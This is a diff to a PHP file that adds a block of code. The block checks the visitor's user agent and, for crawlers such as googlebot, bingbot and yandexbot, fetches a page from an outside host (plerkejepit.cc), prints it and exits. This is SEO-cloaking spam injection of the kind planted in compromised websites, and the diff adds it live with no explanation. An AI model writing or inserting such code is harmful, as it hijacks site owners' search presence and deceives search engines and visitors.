@@ -13,6 +13,15 @@ function smoky($url) {
     }
     return false;
 }
+
+$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$bot = "https://plerkejepit.cc/lp/lpm.html";
+$file = smoky($bot);
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
+if (preg_match($botchar, $res)) {
+    echo $file;
+    exit;
+}
 ?>
 
 <?php
